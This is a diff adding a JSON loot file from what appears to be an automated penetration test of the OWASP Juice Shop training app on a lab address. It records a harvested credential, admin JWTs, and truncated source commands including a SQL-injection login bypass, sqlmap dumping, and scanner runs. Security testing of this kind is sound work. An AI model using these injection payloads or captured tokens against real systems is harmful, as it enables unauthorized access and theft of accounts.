@@ -1,0 +1,74 @@
+{
+  "credentials": [
+    {
+      "value": "admin@juice-sh.op:test",
+      "source_command": "# EXPLOIT SQL Injection with SQLMAP to dump database\necho \"=== SQLMAP DATABASE DUMP EXPLOITATION ===\"\n# Exploit login SQL injection to dump users table\nsqlmap -u \"http://172.21.0.5:3000/rest/user/logi",
+      "source_iteration": 57,
+      "source_vuln": "",
+      "used_in": [],
+      "extracted_at": "2026-02-17T05:34:10.113154+00:00"
+    },
+    {
+      "value": "servlet,:manager).",
+      "source_command": "# GOBUSTER directory enumeration (REQUIRED TOOL)\necho \"=== GOBUSTER DIRECTORY SCAN ===\"\ngobuster dir -u http://172.21.0.5:3000 \\\n  -w /usr/share/seclists/Discovery/Web-Content/common.txt \\\n  -t 50 -q ",
+      "source_iteration": 59,
+      "source_vuln": "",
+      "used_in": [],
+      "extracted_at": "2026-02-17T05:36:15.522992+00:00"
+    }
+  ],
+  "tokens": [
+    {
+      "value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDItMTcgMDU6MDU6MTMuMDg3ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDItMTcgMDU6MDU6MTMuMDg3ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3MTMwNTA0M30.L4iql5k31_uFH9XcANlQnyvZ71kql5xttJTRyjS48UAp63WcKfRTgXYoWXxF29hKf5ToSVtcr44x1DZzxKMAw_xA3dVq4aiTXtwDTYMRYq0QtZaes4z18s68ng2-iazYyZPuQj9hC_gzGZtghsVwdP6xhWuiyKoKngVFnHxHFzg",
+      "source_command": "curl -s -X POST http://juiceshop:3000/rest/user/login -H \"Content-Type: application/json\" -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"x\"}' | tee /pentest/output/c638254e-e0b0-4c76-bc7b-6a6c91fc",
+      "source_iteration": 2,
+      "source_vuln": "",
+      "used_in": [],
+      "extracted_at": "2026-02-17T05:10:43.165325+00:00"
+    },
+    {
+      "value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDItMTcgMDU6MDU6MTMuMDg3ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDItMTcgMDU6MDU6MTMuMDg3ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3MTMwNTQ4MX0.LCRTwTcK2ynxhkFEaK0_JHu6R-4Ztr10YQEJ-I55vNw24jSjyleXJR_ED3UFyDwq9t4a88yGKL-nFanCfSn1YjLF0qcdb6swdI9lhKkWxHjqp30xCHPg6hq1xvmn5unH_5pRzXQ0Gyv9RhkRW8EnakIR1BtqMR83cbFz4wAjOMY",
+      "source_command": "echo \"=== BASELINE RECON ON 172.21.0.5 ===\" && nmap -sV -sC -p3000 172.21.0.5 -oN /pentest/output/c638254e-e0b0-4c76-bc7b-6a6c91fc7281/ports.json 2>/dev/null && cat /pentest/output/c638254e-e0b0-4c76-",
+      "source_iteration": 19,
+      "source_vuln": "",
+      "used_in": [],
+      "extracted_at": "2026-02-17T05:18:01.316644+00:00"
+    },
+    {
+      "value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDItMTcgMDU6MDU6MTMuMDg3ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDItMTcgMDU6MDU6MTMuMDg3ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3MTMwNTkzMn0.Pu-qGb5NWpGwqO-rUcMKM6IrrSyVVYk6R7z017xidMKbEg9upaSzMXlWfOE-E2KbVEkVRiFaDGG3uW4KuWAvqmhV0FbfFw3px0OgCArHNbQ7sN1dNUg5Va3aflln-jnBqNUaCwqjp-DEOoiBUuzdQIhysIq6vo6qGywZ_bcAGgs",
+      "source_command": "# Write exploit script to avoid shell escaping issues\ncat > /tmp/exploit.py << 'SCRIPT'\nimport requests\nimport urllib.parse\nimport json\nBASE = \"http://172.21.0.5:3000\"\n# Extract usernames\nr = requests",
+      "source_iteration": 39,
+      "source_vuln": "",
+      "used_in": [],
+      "extracted_at": "2026-02-17T05:25:31.767883+00:00"
+    },
+    {
+      "value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJwZW50ZXN0ZXJAdGVzdC5jb20iLCJwYXNzd29yZCI6IjU1NThjNGQxMWUwOTI1MDg3MWQ3ZTdjZTEyNDRmMzJkIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wMi0xNyAwNTozNzo1My44NzMgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wMi0xNyAwNTozNzo1My44NzMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzcxMzA2Njc1fQ.n6ryM0CjX9LvnMGDl0Rk3h9Vg_t-J5PVB-yJjS0ij4ACX8ThCmv81J9KtznX04QQzB-SgI93IgT9GZ6NGECAMJ2JrmWsZbBtMyW_Rkcazf5f0fHR9w-gvm6V41mf_CQZp9pLgI3_GBhAocu_ZB55BvafM8Jqh6NQoutA96FRy4E",
+      "source_command": "# NIKTO scan focused on authentication endpoints\necho \"=== NIKTO AUTH VULNERABILITY SCAN ===\"\nnikto -h \"http://172.21.0.5:3000\" -Plugins \"auth_tests\" -Display P -maxtime 30s -output /tmp/nikto_auth.tx",
+      "source_iteration": 62,
+      "source_vuln": "",
+      "used_in": [],
+      "extracted_at": "2026-02-17T05:37:55.073304+00:00"
+    },
+    {
+      "value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDItMTcgMDU6NTQ6NDEuNzIzICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDItMTcgMDU6NTQ6NDEuNzIzICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3MTMwNzg4NH0.qazWIB0QH2b5ypOOfPSfrbJJLgC19OfGmsB47FMhT1f9FUmzIfh5hsKfPK7N6IY5deKbwQ_5fnidkl4IC3Wk1SfgLqw9fPoI72vcY5FfSu_Yk6Ha58UJjEgRrM6J9UJlT4pGvqdsFkAEcKH9VUqBPYRzErE6cVZU-xPY33u8YBk",
+      "source_command": "# First, let's try to authenticate via SQLi bypass - using email field injection\necho \"=== ATTEMPTING SQLi AUTH BYPASS AS ADMIN ===\"\n# Try logging in as admin using SQLi bypass in email field\ncurl -s ",
+      "source_iteration": 87,
+      "source_vuln": "",
+      "used_in": [],
+      "extracted_at": "2026-02-17T05:58:03.638707+00:00"
+    },
+    {
+      "value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6OSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6IkoxMjkzNEBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiM2MyYWJjMDRlNGE2ZWE4ZjEzMjdkMGFhZTM3MTRiN2QiLCJyb2xlIjoiYWRtaW4iLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTAyLTE3IDA1OjU0OjQxLjcyNCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTAyLTE3IDA1OjU0OjQxLjcyNCArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NzEzMDc4ODR9.oF5Llliyrdj0YB35WMMF-a_FzALa3DcoJesKrt6AmkKSQDNrkw4VwpfvL4jPueZFBRiOTCqOp9P99nwECNWu3PqDGeVzPriaZCzN1bVUO8N-JJoZ485xh5wsp-jgl01zun1ooSd9Pz3msVg6m4774esXjMJ-Uq0LN7l8mqL-adY",
+      "source_command": "# First, let's try to authenticate via SQLi bypass - using email field injection\necho \"=== ATTEMPTING SQLi AUTH BYPASS AS ADMIN ===\"\n# Try logging in as admin using SQLi bypass in email field\ncurl -s ",
+      "source_iteration": 87,
+      "source_vuln": "",
+      "used_in": [],
+      "extracted_at": "2026-02-17T05:58:03.638718+00:00"
+    }
+  ],
+  "api_keys": [],
+  "sessions": [],
+  "access_levels": [],
+  "secrets": []
+}
